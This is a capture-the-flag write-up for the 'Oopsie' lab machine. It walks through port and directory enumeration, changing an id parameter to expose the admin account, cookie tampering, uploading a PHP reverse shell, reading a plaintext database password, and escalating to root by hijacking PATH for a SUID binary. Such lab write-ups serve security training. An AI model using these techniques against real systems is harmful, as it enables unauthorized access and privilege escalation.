# Oopsie

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.148.64/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.148.64/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.148.64/images/]
/index.php            (Status: 200) [Size: 10932]
/js                   (Status: 301) [Size: 311] [--> http://10.129.148.64/js/]
/server-status        (Status: 403) [Size: 278]
/themes               (Status: 301) [Size: 315] [--> http://10.129.148.64/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.148.64/uploads/]
```

We visit the website for further enumeration

from source code we see a login script:

`<script src="/cdn-cgi/login/script.js"></script>`

Now on login page `http://10.129.148.64/cdn-cgi/login/`

`2233 guest guest@megacorp.com`

Accounts page

`2 client client@client.htb`

We can modify url (xss)

changing `id` from 2 to 1 show us admin account

`http://10.129.148.64/cdn-cgi/login/admin.php?content=accounts&id=1`

`34322 admin admin@megacorp.com`

We modify our cookie to login as admin with its id and access uploads page

Now lets upload a php shell and catch a netcat connection

we then get access as `www-data`

Exploring web folders we find `db.php`

```
www-data@oopsie:/var/www/html/cdn-cgi$ cd login
cd login
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php db.php index.php script.js
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
```

```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Ahh that robert...

```
$ cd home
$ ls
robert
$ cd robert
$ ls
user.txt
$ cat user.txt
```

We got User flag

## Privilege Escalation

first we need a TTY

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

check SUID and SGID

SUID  
`find / -perm /4000 2>/dev/null`

```
/snap/core/11420/bin/mount
/snap/core/11420/bin/ping
/snap/core/11420/bin/ping6
/snap/core/11420/bin/su
/snap/core/11420/bin/umount
/snap/core/11420/usr/bin/chfn
/snap/core/11420/usr/bin/chsh
/snap/core/11420/usr/bin/gpasswd
/snap/core/11420/usr/bin/newgrp
/snap/core/11420/usr/bin/passwd
/snap/core/11420/usr/bin/sudo
/snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11420/usr/lib/openssh/ssh-keysign
/snap/core/11420/usr/lib/snapd/snap-confine
/snap/core/11420/usr/sbin/pppd
/snap/core/11743/bin/mount
/snap/core/11743/bin/ping
/snap/core/11743/bin/ping6
/snap/core/11743/bin/su
/snap/core/11743/bin/umount
/snap/core/11743/usr/bin/chfn
/snap/core/11743/usr/bin/chsh
/snap/core/11743/usr/bin/gpasswd
/snap/core/11743/usr/bin/newgrp
/snap/core/11743/usr/bin/passwd
/snap/core/11743/usr/bin/sudo
/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11743/usr/lib/openssh/ssh-keysign
/snap/core/11743/usr/lib/snapd/snap-confine
/snap/core/11743/usr/sbin/pppd
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/bugtracker
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
```

SGID  
`find / -perm /2000 2>/dev/null`

```
/snap/core/11420/etc/chatscripts
/snap/core/11420/etc/ppp/peers
/snap/core/11420/sbin/pam_extrausers_chkpwd
/snap/core/11420/sbin/unix_chkpwd
/snap/core/11420/usr/bin/chage
/snap/core/11420/usr/bin/crontab
/snap/core/11420/usr/bin/dotlockfile
...
```

value `6000` for both

anyway bugtracker in SUID

```
bugtracker
www-data@oopsie:/var/www/html/cdn-cgi/login$ find / -group bugtracker 2>/dev/null
<cdn-cgi/login$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

switched to robert user with the password found in `db.php`

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: M3g4C0rpUs3r!
```

When running bugtracker we notice its try to execute this command
`"cat /root/reports/BUG_ID"`

We could modify that to get root access as it reads in root directory

we also get good informations about filezila usage with BUG_ID from 1 to 3

Lets modify system acces to "cat" command
go /tmp (fav folder)

```
export PATH=/tmp:$PATH
robert@oopsie:/$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ echo '/bin/sh' > cat
echo '/bin/sh' > cat
robert@oopsie:/tmp$ chmod +X cat
chmod +x cat
```

and that is how we got root now

`# rm cat` (just because its not needed anymore)

`# cd /root`

`# cat root.txt`

And we get root flag
